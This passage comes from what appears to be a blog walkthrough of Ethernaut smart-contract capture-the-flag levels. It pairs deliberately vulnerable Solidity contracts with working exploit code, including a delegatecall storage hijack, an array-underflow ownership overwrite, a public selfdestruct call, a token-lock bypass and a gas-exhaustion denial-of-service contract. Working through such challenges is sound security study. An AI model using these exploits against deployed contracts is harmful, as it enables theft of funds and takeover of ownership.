</span><span>  }
</span><span>
</span><span>  modifier </span><span style=color:#88c0d0>gateThree</span><span>(</span><span style=color:#81a1c1>bytes8 </span><span>_gateKey) {
</span><span>    require(</span><span style=color:#81a1c1>uint64</span><span>(</span><span style=color:#81a1c1>bytes8</span><span>(</span><span style=color:#81a1c1>keccak256</span><span>(</span><span style=color:#81a1c1>abi</span><span>.</span><span style=color:#81a1c1>encodePacked</span><span>(</span><span style=color:#81a1c1>msg</span><span>.</span><span style=color:#81a1c1>sender</span><span>)))) </span><span style=color:#81a1c1>^ uint64</span><span>(_gateKey) </span><span style=color:#81a1c1>== </span><span>type(</span><span style=color:#81a1c1>uint64</span><span>).</span><span style=color:#81a1c1>max</span><span>);
</span><span>    _;
</span><span>  }
</span><span>
</span><span>  function </span><span style=color:#88c0d0>enter</span><span>(</span><span style=color:#81a1c1>bytes8 </span><span>_gateKey) </span><span style=color:#81a1c1>public gateOne gateTwo gateThree</span><span>(_gateKey) returns (</span><span style=color:#81a1c1>bool</span><span>) {
</span><span>    entrant </span><span style=color:#81a1c1>= tx</span><span>.</span><span style=color:#81a1c1>origin</span><span>;
</span><span>    return </span><span style=color:#81a1c1>true</span><span>;
</span><span>  }
</span><span>}
</span></code></pre><p>Still three modifier:<ul><li>gateOne: same with the former challenge<li>gateTwo: caller’s code size should be 0, and will be satisfied if calling in constructor.<li>gateTree: <code>uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max)</code>, equivalent to <code>uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ type(uint64).max) == uint64(_gateKey)</code> and can be calculated in this way.</ul><pre class=language-solidity data-lang=solidity style=color:#d8dee9;background-color:#2e3440><code class=language-solidity data-lang=solidity><span style=color:#616e88>// SPDX-License-Identifier: MIT
</span><span>pragma solidity ^</span><span style=color:#b48ead>0.8.0</span><span>;
</span><span>
</span><span>import "./chall/GateKeeperTwo.sol";
</span><span>
</span><span>contract </span><span style=color:#88c0d0>exp </span><span>{
</span><span>    </span><span style=color:#81a1c1>address</span><span> Instance;
</span><span>    
</span><span>    constructor(</span><span style=color:#81a1c1>address </span><span>_addr) {
</span><span>      Instance </span><span style=color:#81a1c1>=</span><span> _addr;
</span><span>      unchecked{
</span><span>          </span><span style=color:#81a1c1>bytes8</span><span> key </span><span style=color:#81a1c1>= bytes8</span><span>( </span><span style=color:#81a1c1>uint64</span><span>(</span><span style=color:#81a1c1>bytes8</span><span>(</span><span style=color:#81a1c1>keccak256</span><span>(</span><span style=color:#81a1c1>abi</span><span>.</span><span style=color:#81a1c1>encodePacked</span><span>(</span><span style=color:#81a1c1>this</span><span>)))) </span><span style=color:#81a1c1>^ </span><span>type(</span><span style=color:#81a1c1>uint64</span><span>).</span><span style=color:#81a1c1>max  </span><span>);
</span><span>          </span><span style=color:#88c0d0>GatekeeperTwo</span><span>(Instance).</span><span style=color:#88c0d0>enter</span><span>(key);
</span><span>      }
</span><span>    }
</span><span>}
</span></code></pre><h2 id=naught-coin>naught coin</h2><pre class=language-solidity data-lang=solidity style=color:#d8dee9;background-color:#2e3440><code class=language-solidity data-lang=solidity><span style=color:#616e88>// SPDX-License-Identifier: MIT
</span><span>pragma solidity ^</span><span style=color:#b48ead>0.8.0</span><span>;
</span><span>
</span><span>import 'openzeppelin-contracts-08/token/ERC20/ERC20.sol';
</span><span>
</span><span> contract </span><span style=color:#88c0d0>NaughtCoin </span><span>is </span><span style=color:#81a1c1>ERC20 </span><span>{
</span><span>
</span><span>  </span><span style=color:#616e88>// string public constant name = 'NaughtCoin';
</span><span>  </span><span style=color:#616e88>// string public constant symbol = '0x0';
</span><span>  </span><span style=color:#616e88>// uint public constant decimals = 18;
</span><span>  </span><span style=color:#81a1c1>uint public</span><span> timeLock </span><span style=color:#81a1c1>= block</span><span>.</span><span style=color:#81a1c1>timestamp + </span><span style=color:#b48ead>10 </span><span style=color:#81a1c1>* </span><span style=color:#b48ead>365 days</span><span>;
</span><span>  </span><span style=color:#81a1c1>uint256 public</span><span> INITIAL_SUPPLY;
</span><span>  </span><span style=color:#81a1c1>address public</span><span> player;
</span><span>
</span><span>  constructor(</span><span style=color:#81a1c1>address </span><span>_player) 
</span><span>  </span><span style=color:#88c0d0>ERC20</span><span>('NaughtCoin', '0x0') {
</span><span>    player </span><span style=color:#81a1c1>=</span><span> _player;
</span><span>    INITIAL_SUPPLY </span><span style=color:#81a1c1>= </span><span style=color:#b48ead>1000000 </span><span style=color:#81a1c1>* </span><span>(</span><span style=color:#b48ead>10</span><span style=color:#81a1c1>**uint256</span><span>(</span><span style=color:#88c0d0>decimals</span><span>()));
</span><span>    </span><span style=color:#616e88>// _totalSupply = INITIAL_SUPPLY;
</span><span>    </span><span style=color:#616e88>// _balances[player] = INITIAL_SUPPLY;
</span><span>    </span><span style=color:#88c0d0>_mint</span><span>(player, INITIAL_SUPPLY);
</span><span>    emit </span><span style=color:#88c0d0>Transfer</span><span>(</span><span style=color:#81a1c1>address</span><span>(</span><span style=color:#b48ead>0</span><span>), player, INITIAL_SUPPLY);
</span><span>  }
</span><span>  
</span><span>  function </span><span style=color:#88c0d0>transfer</span><span>(</span><span style=color:#81a1c1>address </span><span>_to, </span><span style=color:#81a1c1>uint256 </span><span>_value) </span><span style=color:#81a1c1>override public lockTokens </span><span>returns(</span><span style=color:#81a1c1>bool</span><span>) {
</span><span>    </span><span style=color:#81a1c1>super</span><span>.</span><span style=color:#88c0d0>transfer</span><span>(_to, _value);
</span><span>  }
</span><span>
</span><span>  </span><span style=color:#616e88>// Prevent the initial owner from transferring tokens until the timelock has passed
</span><span>  modifier </span><span style=color:#88c0d0>lockTokens</span><span>() {
</span><span>    if (</span><span style=color:#81a1c1>msg</span><span>.</span><span style=color:#81a1c1>sender ==</span><span> player) {
</span><span>      require(</span><span style=color:#81a1c1>block</span><span>.</span><span style=color:#81a1c1>timestamp ></span><span> timeLock);
</span><span>      _;
</span><span>    } else {
</span><span>     _;
</span><span>    }
</span><span>  } 
</span><span>} 
</span></code></pre><p>This contract is inherited from <a href=https://docs.openzeppelin.com/contracts/3.x/api/token/erc20>ERC20</a> and overrided the function <code>transfer</code>.<p>Just have a view of official documents will find the function <code>approval</code> and <code>transferFrom</code>, which is exploitable.<pre class=language-solidity data-lang=solidity style=color:#d8dee9;background-color:#2e3440><code class=language-solidity data-lang=solidity><span>contract.approve(player,</span><span style=color:#88c0d0>toWei</span><span>("1000000"))
</span><span>contract.transferFrom(player,contract.</span><span style=color:#81a1c1>address</span><span>,</span><span style=color:#88c0d0>toWei</span><span>("1000000"))
</span></code></pre><h2 id=preservation>Preservation</h2><pre class=language-solidity data-lang=solidity style=color:#d8dee9;background-color:#2e3440><code class=language-solidity data-lang=solidity><span style=color:#616e88>// SPDX-License-Identifier: MIT
</span><span>pragma solidity ^</span><span style=color:#b48ead>0.8.0</span><span>;
</span><span>
</span><span>contract </span><span style=color:#88c0d0>Preservation </span><span>{
</span><span>
</span><span>  </span><span style=color:#616e88>// public library contracts 
</span><span>  </span><span style=color:#81a1c1>address public</span><span> timeZone1Library;
</span><span>  </span><span style=color:#81a1c1>address public</span><span> timeZone2Library;
</span><span>  </span><span style=color:#81a1c1>address public</span><span> owner; 
</span><span>  </span><span style=color:#81a1c1>uint</span><span> storedTime;
</span><span>  </span><span style=color:#616e88>// Sets the function signature for delegatecall
</span><span>  </span><span style=color:#81a1c1>bytes4 constant</span><span> setTimeSignature </span><span style=color:#81a1c1>= bytes4</span><span>(</span><span style=color:#81a1c1>keccak256</span><span>("setTime(uint256)"));
</span><span>
</span><span>  constructor(</span><span style=color:#81a1c1>address </span><span>_timeZone1LibraryAddress, </span><span style=color:#81a1c1>address </span><span>_timeZone2LibraryAddress) {
</span><span>    timeZone1Library </span><span style=color:#81a1c1>=</span><span> _timeZone1LibraryAddress; 
</span><span>    timeZone2Library </span><span style=color:#81a1c1>=</span><span> _timeZone2LibraryAddress; 
</span><span>    owner </span><span style=color:#81a1c1>= msg</span><span>.</span><span style=color:#81a1c1>sender</span><span>;
</span><span>  }
</span><span> 
</span><span>  </span><span style=color:#616e88>// set the time for timezone 1
</span><span>  function </span><span style=color:#88c0d0>setFirstTime</span><span>(</span><span style=color:#81a1c1>uint </span><span>_timeStamp) </span><span style=color:#81a1c1>public </span><span>{
</span><span>    timeZone1Library.</span><span style=color:#81a1c1>delegatecall</span><span>(</span><span style=color:#81a1c1>abi</span><span>.</span><span style=color:#81a1c1>encodePacked</span><span>(setTimeSignature, _timeStamp));
</span><span>  }
</span><span>
</span><span>  </span><span style=color:#616e88>// set the time for timezone 2
</span><span>  function </span><span style=color:#88c0d0>setSecondTime</span><span>(</span><span style=color:#81a1c1>uint </span><span>_timeStamp) </span><span style=color:#81a1c1>public </span><span>{
</span><span>    timeZone2Library.</span><span style=color:#81a1c1>delegatecall</span><span>(</span><span style=color:#81a1c1>abi</span><span>.</span><span style=color:#81a1c1>encodePacked</span><span>(setTimeSignature, _timeStamp));
</span><span>  }
</span><span>}
</span><span>
</span><span style=color:#616e88>// Simple library contract to set the time
</span><span>contract </span><span style=color:#88c0d0>LibraryContract </span><span>{
</span><span>
</span><span>  </span><span style=color:#616e88>// stores a timestamp 
</span><span>  </span><span style=color:#81a1c1>uint</span><span> storedTime;  
</span><span>
</span><span>  function </span><span style=color:#88c0d0>setTime</span><span>(</span><span style=color:#81a1c1>uint </span><span>_time) </span><span style=color:#81a1c1>public </span><span>{
</span><span>    storedTime </span><span style=color:#81a1c1>=</span><span> _time;
</span><span>  }
</span><span>}
</span></code></pre><p>https://learnblockchain.cn/article/5372: <code>delegateCall</code> stating variables are actually modified not by their names, but by their declared location in storage.<p>That is mean when delegateCall LibraryContract, <code>storedTime</code> was pointed to the address of <code>timeZone1Library</code> in Preservation’s storage. Through that, we can change the timeZone1Library to our evil contract, and call <code>setFirstTime</code> again to trigger evil code.<pre class=language-solidity data-lang=solidity style=color:#d8dee9;background-color:#2e3440><code class=language-solidity data-lang=solidity><span style=color:#616e88>// SPDX-License-Identifier: MIT
</span><span>pragma solidity ^</span><span style=color:#b48ead>0.8.0</span><span>;
</span><span>
</span><span>contract </span><span style=color:#88c0d0>exp </span><span>{
</span><span>
</span><span>  </span><span style=color:#616e88>// stores a timestamp 
</span><span>  </span><span style=color:#81a1c1>uint</span><span> holder1;
</span><span>  </span><span style=color:#81a1c1>uint</span><span> holder2;
</span><span>  </span><span style=color:#81a1c1>address</span><span> owner;
</span><span>
</span><span>  function </span><span style=color:#88c0d0>setTime</span><span>(</span><span style=color:#81a1c1>uint </span><span>_time) </span><span style=color:#81a1c1>public </span><span>{
</span><span>    holder1 </span><span style=color:#81a1c1>=</span><span> _time;
</span><span>    owner </span><span style=color:#81a1c1>= address</span><span>(</span><span style=color:#b48ead>0xe24C5c44a7c4E75d5E2e461C35d863db0385E3c9</span><span>);
</span><span>  }
</span><span>}
</span></code></pre><pre class=language-solidity data-lang=solidity style=color:#d8dee9;background-color:#2e3440><code class=language-solidity data-lang=solidity><span>> contract.setFirstTime('0x12e47be67263aF5939fe689A549c3e2a9110417F') </span><span style=color:#616e88>//deployed exp contract address
</span><span>> await web3.eth.getStorageAt(contract.</span><span style=color:#81a1c1>address</span><span>, </span><span style=color:#b48ead>0</span><span>)
</span><span>< '0x00000000000000000000000012e47be67263af5939fe689a549c3e2a9110417f'
</span><span>> contract.setFirstTime('0x12e47be67263aF5939fe689A549c3e2a9110417F') </span><span style=color:#616e88>//simply could be anything valid
</span></code></pre><h2 id=recovery>Recovery</h2><pre class=language-solidity data-lang=solidity style=color:#d8dee9;background-color:#2e3440><code class=language-solidity data-lang=solidity><span style=color:#616e88>// SPDX-License-Identifier: MIT
</span><span>pragma solidity ^</span><span style=color:#b48ead>0.8.0</span><span>;
</span><span>
</span><span>contract </span><span style=color:#88c0d0>Recovery </span><span>{
</span><span>
</span><span>  </span><span style=color:#616e88>//generate tokens
</span><span>  function </span><span style=color:#88c0d0>generateToken</span><span>(</span><span style=color:#81a1c1>string memory </span><span>_name, </span><span style=color:#81a1c1>uint256 </span><span>_initialSupply) </span><span style=color:#81a1c1>public </span><span>{
</span><span>    new </span><span style=color:#88c0d0>SimpleToken</span><span>(_name, </span><span style=color:#81a1c1>msg</span><span>.</span><span style=color:#81a1c1>sender</span><span>, _initialSupply);
</span><span>  
</span><span>  }
</span><span>}
</span><span>
</span><span>contract </span><span style=color:#88c0d0>SimpleToken </span><span>{
</span><span>
</span><span>  </span><span style=color:#81a1c1>string public</span><span> name;
</span><span>  mapping (</span><span style=color:#81a1c1>address </span><span>=> </span><span style=color:#81a1c1>uint</span><span>) </span><span style=color:#81a1c1>public</span><span> balances;
</span><span>
</span><span>  </span><span style=color:#616e88>// constructor
</span><span>  constructor(</span><span style=color:#81a1c1>string memory </span><span>_name, </span><span style=color:#81a1c1>address </span><span>_creator, </span><span style=color:#81a1c1>uint256 </span><span>_initialSupply) {
</span><span>    name </span><span style=color:#81a1c1>=</span><span> _name;
</span><span>    balances[_creator] </span><span style=color:#81a1c1>=</span><span> _initialSupply;
</span><span>  }
</span><span>
</span><span>  </span><span style=color:#616e88>// collect ether in return for tokens
</span><span>  receive() </span><span style=color:#81a1c1>external payable </span><span>{
</span><span>    balances[</span><span style=color:#81a1c1>msg</span><span>.</span><span style=color:#81a1c1>sender</span><span>] </span><span style=color:#81a1c1>= msg</span><span>.</span><span style=color:#81a1c1>value * </span><span style=color:#b48ead>10</span><span>;
</span><span>  }
</span><span>
</span><span>  </span><span style=color:#616e88>// allow transfers of tokens
</span><span>  function </span><span style=color:#88c0d0>transfer</span><span>(</span><span style=color:#81a1c1>address </span><span>_to, </span><span style=color:#81a1c1>uint </span><span>_amount) </span><span style=color:#81a1c1>public </span><span>{ 
</span><span>    require(balances[</span><span style=color:#81a1c1>msg</span><span>.</span><span style=color:#81a1c1>sender</span><span>] </span><span style=color:#81a1c1>>=</span><span> _amount);
</span><span>    balances[</span><span style=color:#81a1c1>msg</span><span>.</span><span style=color:#81a1c1>sender</span><span>] </span><span style=color:#81a1c1>=</span><span> balances[</span><span style=color:#81a1c1>msg</span><span>.</span><span style=color:#81a1c1>sender</span><span>] </span><span style=color:#81a1c1>-</span><span> _amount;
</span><span>    balances[_to] </span><span style=color:#81a1c1>=</span><span> _amount;
</span><span>  }
</span><span>
</span><span>  </span><span style=color:#616e88>// clean up after ourselves
</span><span>  function </span><span style=color:#88c0d0>destroy</span><span>(</span><span style=color:#81a1c1>address payable </span><span>_to) </span><span style=color:#81a1c1>public </span><span>{
</span><span>    </span><span style=color:#81a1c1>selfdestruct</span><span>(_to);
</span><span>  }
</span><span>}
</span></code></pre><p>Tracking the contract creation(Internal transcation) on etherscan would show the address of created token contract. Any note that <code>destroy</code> function was setted to be public, call this function could solve this challenge<pre class=language-bash data-lang=bash style=color:#d8dee9;background-color:#2e3440><code class=language-bash data-lang=bash><span style=color:#88c0d0>$</span><span> cast send 0xe8b72c8696d6370bc1b0ba465477c3c3c650cde0 </span><span style=color:#a3be8c>"destroy(address)"</span><span> -r </span><span style=color:#a3be8c>"https://1rpc.io/sepolia"</span><span> --private-key </span><span style=color:#81a1c1><</span><span style=color:#b48ead>64</span><span>bytesKey</span><span style=color:#81a1c1>> </span><span style=color:#eceff4>-</span><span>- </span><span style=color:#a3be8c>'0xe24C5c44a7c4E75d5E2e461C35d863db0385E3c9'
</span></code></pre><blockquote><p>Contract addresses are deterministic and are calculated by <code>keccak256(address, nonce)</code> where the <code>address</code> is the address of the contract (or ethereum address that created the transaction) and <code>nonce</code> is the number of contracts the spawning contract has created (or the transaction nonce, for regular transactions).<p>Because of this, one can send ether to a pre-determined address (which has no private key) and later create a contract at that address which recovers the ether. This is a non-intuitive and somewhat secretive way to (dangerously) store ether without holding a private key.<p>An interesting <a href=https://swende.se/blog/Ethereum_quirks_and_vulns.html>blog post</a> by Martin Swende details potential use cases of this.<p>If you’re going to implement this technique, make sure you don’t miss the nonce, or your funds will be lost forever.</blockquote><p>seems not intended… but the blog interesting exactly.<h2 id=magicnumber>MagicNumber</h2><pre class=language-solidity data-lang=solidity style=color:#d8dee9;background-color:#2e3440><code class=language-solidity data-lang=solidity><span style=color:#616e88>// SPDX-License-Identifier: MIT
</span><span>pragma solidity ^</span><span style=color:#b48ead>0.8.0</span><span>;
</span><span>
</span><span>contract </span><span style=color:#88c0d0>MagicNum </span><span>{
</span><span>
</span><span>  </span><span style=color:#81a1c1>address public</span><span> solver;
</span><span>
</span><span>  constructor() {}
</span><span>
</span><span>  function </span><span style=color:#88c0d0>setSolver</span><span>(</span><span style=color:#81a1c1>address </span><span>_solver) </span><span style=color:#81a1c1>public </span><span>{
</span><span>    solver </span><span style=color:#81a1c1>=</span><span> _solver;
</span><span>  }
</span><span>
</span><span>  </span><span style=color:#616e88>/*
</span><span style=color:#616e88>    ____________/\\\_______/\\\\\\\\\_____        
</span><span style=color:#616e88>     __________/\\\\\_____/\\\///////\\\___       
</span><span style=color:#616e88>      ________/\\\/\\\____\///______\//\\\__      
</span><span style=color:#616e88>       ______/\\\/\/\\\______________/\\\/___     
</span><span style=color:#616e88>        ____/\\\/__\/\\\___________/\\\//_____    
</span><span style=color:#616e88>         __/\\\\\\\\\\\\\\\\_____/\\\//________   
</span><span style=color:#616e88>          _\///////////\\\//____/\\\/___________  
</span><span style=color:#616e88>           ___________\/\\\_____/\\\\\\\\\\\\\\\_ 
</span><span style=color:#616e88>            ___________\///_____\///////////////__
</span><span style=color:#616e88>  */
</span><span>}
</span></code></pre><blockquote><p>To solve this level, you only need to provide the Ethernaut with a <code>Solver</code>, a contract that responds to <code>whatIsTheMeaningOfLife()</code> with the right number.<p>Easy right? Well… there’s a catch.<p>The solver’s code needs to be really tiny. Really reaaaaaallly tiny. Like freakin’ really really itty-bitty tiny: 10 opcodes at most.<p>Hint: Perhaps its time to leave the comfort of the Solidity compiler momentarily, and build this one by hand O_o. That’s right: Raw EVM bytecode.<p>Good luck!</blockquote><p>write valid opcodes to implement the contract like following: (I found it on the internet somewhere)<ol><li><p>0x60 - PUSH1 –> PUSH(0x2a) –> 0x602a (Pushing 2a or 42)</p><li><p>0x60 - PUSH1 –> PUSH(0x80) –> 0x6080 (Pushing an arbitrary selected memory slot 80)</p><li><p>0x52 - MSTORE –> MSTORE –> 0x52 (Store value p=0x2a at position v=0x80 in memory)</p><li><p>0x60 - PUSH1 –> PUSH(0x20) –> 0x6020 (Size of value is 32 bytes)</p><li><p>0x60 - PUSH1 –> PUSH(0x80) –> 0x6080 (Value was stored in slot 0x80)</p><li><p>0xf3 - RETURN –> RETURN –> 0xf3 (Return value at p=0x80 slot and of size s=0x20)</p></ol><pre class=language-solidity data-lang=solidity style=color:#d8dee9;background-color:#2e3440><code class=language-solidity data-lang=solidity><span style=color:#616e88>// deploy it and get contractAddress
</span><span>await web3.eth.sendTransaction({ from:player, data: '0x69602a60005260206000f3600052600a6016f3' });
</span><span style=color:#616e88>// submit the solver contract
</span><span>await contract.setSolver('0x5ba95745bb7ae5ac15ab9968e665ab761ca7b62f')
</span></code></pre><h2 id=alien-codex>Alien Codex</h2><pre class=language-solidity data-lang=solidity style=color:#d8dee9;background-color:#2e3440><code class=language-solidity data-lang=solidity><span style=color:#616e88>// SPDX-License-Identifier: MIT
</span><span>pragma solidity ^</span><span style=color:#b48ead>0.5.0</span><span>;
</span><span>
</span><span>import '../helpers/Ownable-05.sol';
</span><span>
</span><span>contract </span><span style=color:#88c0d0>AlienCodex </span><span>is </span><span style=color:#88c0d0>Ownable </span><span>{
</span><span>
</span><span>  </span><span style=color:#81a1c1>bool public</span><span> contact;
</span><span>  </span><span style=color:#81a1c1>bytes32</span><span>[] </span><span style=color:#81a1c1>public</span><span> codex;
</span><span>
</span><span>  modifier </span><span style=color:#88c0d0>contacted</span><span>() {
</span><span>    assert(contact);
</span><span>    _;
</span><span>  }
</span><span>  
</span><span>  function </span><span style=color:#88c0d0>makeContact</span><span>() </span><span style=color:#81a1c1>public </span><span>{
</span><span>    contact </span><span style=color:#81a1c1>= true</span><span>;
</span><span>  }
</span><span>
</span><span>  function </span><span style=color:#88c0d0>record</span><span>(</span><span style=color:#81a1c1>bytes32 </span><span>_content) </span><span style=color:#81a1c1>contacted public </span><span>{
</span><span>    codex.</span><span style=color:#88c0d0>push</span><span>(_content);
</span><span>  }
</span><span>
</span><span>  function </span><span style=color:#88c0d0>retract</span><span>() </span><span style=color:#81a1c1>contacted public </span><span>{
</span><span>    codex.</span><span style=color:#81a1c1>length--</span><span>;
</span><span>  }
</span><span>
</span><span>  function </span><span style=color:#88c0d0>revise</span><span>(</span><span style=color:#81a1c1>uint </span><span>i, </span><span style=color:#81a1c1>bytes32 </span><span>_content) </span><span style=color:#81a1c1>contacted public </span><span>{
</span><span>    codex[i] </span><span style=color:#81a1c1>=</span><span> _content;
</span><span>  }
</span><span>}
</span></code></pre><p>When array declared, it will occupy a slot in memory like other type do as its length, and set a base address for the data area by following formula:<pre style=color:#d8dee9;background-color:#2e3440><code><span>keccak(slot)
</span></code></pre><p>and the data will be store like:<pre style=color:#d8dee9;background-color:#2e3440><code><span>codex[0] => (keccak(slot) + 0) % 2 ** 256
</span><span>codex[1] => (keccak(slot) + 1) % 2 ** 256
</span><span>...
</span><span>codex[i] => (keccak(slot) + i) % 2 ** 256
</span></code></pre><p>thus we can override the data of owner to claim ownership.<pre style=color:#d8dee9;background-color:#2e3440><code><span>&codex[i] == &owner
</span><span>=> (keccak(length_slot) + i) % 2 ** 256 == 0
</span><span>=> (keccak(length_slot) + i) == 2 ** 256
</span><span>=> i == 2 ** 256 - keccak(length_slot)
</span><span>+ length_slot = 1
</span><span>=> i == 2 ** 256 - keccak(1)
</span></code></pre><p>In addition, it should be noted that the array value will be determined according to the length range, so it is necessary to cause the length variable to underflow first.<pre class=language-solidity data-lang=solidity style=color:#d8dee9;background-color:#2e3440><code class=language-solidity data-lang=solidity><span style=color:#616e88>// SPDX-License-Identifier: MIT
</span><span>pragma solidity ^</span><span style=color:#b48ead>0.8.0</span><span>;
</span><span>
</span><span>interface </span><span style=color:#88c0d0>IAlienCodex </span><span>{
</span><span>    function </span><span style=color:#88c0d0>makeContact</span><span>() </span><span style=color:#81a1c1>external</span><span>;
</span><span>    function </span><span style=color:#88c0d0>retract</span><span>() </span><span style=color:#81a1c1>external</span><span>;
</span><span>    function </span><span style=color:#88c0d0>revise</span><span>(</span><span style=color:#81a1c1>uint </span><span>i, </span><span style=color:#81a1c1>bytes32 </span><span>_content) </span><span style=color:#81a1c1>external</span><span>;
</span><span>}
</span><span>
</span><span>contract </span><span style=color:#88c0d0>exp </span><span>{
</span><span>    IAlienCodex Instance;
</span><span>
</span><span>    constructor(</span><span style=color:#81a1c1>address </span><span>_addr) {
</span><span>      Instance </span><span style=color:#81a1c1>= </span><span style=color:#88c0d0>IAlienCodex</span><span>(_addr);
</span><span>    }
</span><span>
</span><span>    function </span><span style=color:#88c0d0>attack</span><span>() </span><span style=color:#81a1c1>public </span><span>{
</span><span>        unchecked{
</span><span>            Instance.</span><span style=color:#88c0d0>makeContact</span><span>();
</span><span>            Instance.</span><span style=color:#88c0d0>retract</span><span>();
</span><span>            </span><span style=color:#81a1c1>uint</span><span> index </span><span style=color:#81a1c1>= uint256</span><span>(</span><span style=color:#b48ead>2</span><span>)</span><span style=color:#81a1c1>**uint256</span><span>(</span><span style=color:#b48ead>256</span><span>) </span><span style=color:#81a1c1>- uint256</span><span>(</span><span style=color:#81a1c1>keccak256</span><span>(</span><span style=color:#81a1c1>abi</span><span>.</span><span style=color:#81a1c1>encodePacked</span><span>(</span><span style=color:#81a1c1>uint256</span><span>(</span><span style=color:#b48ead>1</span><span>))));
</span><span>            Instance.</span><span style=color:#88c0d0>revise</span><span>(index, </span><span style=color:#81a1c1>bytes32</span><span>(</span><span style=color:#81a1c1>uint256</span><span>(</span><span style=color:#81a1c1>uint160</span><span>(</span><span style=color:#81a1c1>tx</span><span>.</span><span style=color:#81a1c1>origin</span><span>))));
</span><span>        }
</span><span>    }
</span><span>
</span><span>}
</span></code></pre><h2 id=denial>Denial</h2><pre class=language-solidity data-lang=solidity style=color:#d8dee9;background-color:#2e3440><code class=language-solidity data-lang=solidity><span style=color:#616e88>// SPDX-License-Identifier: MIT
</span><span>pragma solidity ^</span><span style=color:#b48ead>0.8.0</span><span>;
</span><span>contract </span><span style=color:#88c0d0>Denial </span><span>{
</span><span>
</span><span>    </span><span style=color:#81a1c1>address public</span><span> partner; </span><span style=color:#616e88>// withdrawal partner - pay the gas, split the withdraw
</span><span>    </span><span style=color:#81a1c1>address public constant</span><span> owner </span><span style=color:#81a1c1>= address</span><span>(</span><span style=color:#b48ead>0xA9E</span><span>);
</span><span>    </span><span style=color:#81a1c1>uint</span><span> timeLastWithdrawn;
</span><span>    mapping(</span><span style=color:#81a1c1>address </span><span>=> </span><span style=color:#81a1c1>uint</span><span>) withdrawPartnerBalances; </span><span style=color:#616e88>// keep track of partners balances
</span><span>
</span><span>    function </span><span style=color:#88c0d0>setWithdrawPartner</span><span>(</span><span style=color:#81a1c1>address </span><span>_partner) </span><span style=color:#81a1c1>public </span><span>{
</span><span>        partner </span><span style=color:#81a1c1>=</span><span> _partner;
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#616e88>// withdraw 1% to recipient and 1% to owner
</span><span>    function </span><span style=color:#88c0d0>withdraw</span><span>() </span><span style=color:#81a1c1>public </span><span>{
</span><span>        </span><span style=color:#81a1c1>uint</span><span> amountToSend </span><span style=color:#81a1c1>= address</span><span>(</span><span style=color:#81a1c1>this</span><span>).balance </span><span style=color:#81a1c1>/ </span><span style=color:#b48ead>100</span><span>;
</span><span>        </span><span style=color:#616e88>// perform a call without checking return
</span><span>        </span><span style=color:#616e88>// The recipient can revert, the owner will still get their share
</span><span>        partner.</span><span style=color:#81a1c1>call</span><span>{value:amountToSend}("");
</span><span>        </span><span style=color:#81a1c1>payable</span><span>(owner).</span><span style=color:#88c0d0>transfer</span><span>(amountToSend);
</span><span>        </span><span style=color:#616e88>// keep track of last withdrawal time
</span><span>        timeLastWithdrawn </span><span style=color:#81a1c1>= block</span><span>.</span><span style=color:#81a1c1>timestamp</span><span>;
</span><span>        withdrawPartnerBalances[partner] </span><span style=color:#81a1c1>+=</span><span>  amountToSend;
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#616e88>// allow deposit of funds
</span><span>    receive() </span><span style=color:#81a1c1>external payable </span><span>{}
</span><span>
</span><span>    </span><span style=color:#616e88>// convenience function
</span><span>    function </span><span style=color:#88c0d0>contractBalance</span><span>() </span><span style=color:#81a1c1>public view </span><span>returns (</span><span style=color:#81a1c1>uint</span><span>) {
</span><span>        return </span><span style=color:#81a1c1>address</span><span>(</span><span style=color:#81a1c1>this</span><span>).balance;
</span><span>    }
</span><span>}
</span></code></pre><p>To complete this level, we need prevent the owner from withdrawing funds when they call <code>withdraw()</code>. that’s mean we should revert the tx in <code>withdraw</code> function calling process. After trying it, I found that contracts without payable will not cause revert. But we can cause gas exhaustion through an infinite loop, thus preventing the transaction from continuing.<pre class=language-solidity data-lang=solidity style=color:#d8dee9;background-color:#2e3440><code class=language-solidity data-lang=solidity><span style=color:#616e88>// SPDX-License-Identifier: MIT
</span><span>pragma solidity ^</span><span style=color:#b48ead>0.8.0</span><span>;
</span><span>
</span><span>contract </span><span style=color:#88c0d0>exp</span><span>{
</span><span>    fallback () </span><span style=color:#81a1c1>payable external </span><span>{
</span><span>        while(</span><span style=color:#81a1c1>true</span><span>){}
</span><span>    }
</span><span>}
</span></code></pre><blockquote><p>This level demonstrates that external calls to unknown contracts can still create denial of service attack vectors if a fixed amount of gas is not specified.<p>If you are using a low level <code>call</code> to continue executing in the event an external call reverts, ensure that you specify a fixed gas stipend. For example <code>call.gas(100000).value()</code>.<p>Typically one should follow the <a href=http://solidity.readthedocs.io/en/latest/security-considerations.html#use-the-checks-effects-interactions-pattern>checks-effects-interactions</a> pattern to avoid reentrancy attacks, there can be other circumstances (such as multiple external calls at the end of a function) where issues such as this can arise.<p><em>Note</em>: An external <code>CALL</code> can use at most 63/64 of the gas currently available at the time of the <code>CALL</code>. Thus, depending on how much gas is required to complete a transaction, a transaction of sufficiently high gas (i.e. one such that 1/64 of the gas is capable of completing the remaining opcodes in the parent call) can be used to mitigate this particular attack.</blockquote><h2 id=shop>shop</h2><pre class=language-solidity data-lang=solidity style=color:#d8dee9;background-color:#2e3440><code class=language-solidity data-lang=solidity><span style=color:#616e88>// SPDX-License-Identifier: MIT
</span><span>pragma solidity ^</span><span style=color:#b48ead>0.8.0</span><span>;
</span><span>
</span><span>interface </span><span style=color:#88c0d0>Buyer </span><span>{
</span><span>  function </span><span style=color:#88c0d0>price</span><span>() </span><span style=color:#81a1c1>external view </span><span>returns (</span><span style=color:#81a1c1>uint</span><span>);
</span><span>}
</span><span>
</span><span>contract </span><span style=color:#88c0d0>Shop </span><span>{
</span><span>  </span><span style=color:#81a1c1>uint public</span><span> price </span><span style=color:#81a1c1>= </span><span style=color:#b48ead>100</span><span>;
</span><span>  </span><span style=color:#81a1c1>bool public</span><span> isSold;
</span><span>
</span><span>  function </span><span style=color:#88c0d0>buy</span><span>() </span><span style=color:#81a1c1>public </span><span>{
</span><span>    Buyer _buyer </span><span style=color:#81a1c1>= </span><span style=color:#88c0d0>Buyer</span><span>(</span><span style=color:#81a1c1>msg</span><span>.</span><span style=color:#81a1c1>sender</span><span>);
</span><span>
</span><span>    if (_buyer.</span><span style=color:#88c0d0>price</span><span>() </span><span style=color:#81a1c1>>=</span><span> price </span><span style=color:#81a1c1>&& !</span><span>isSold) {
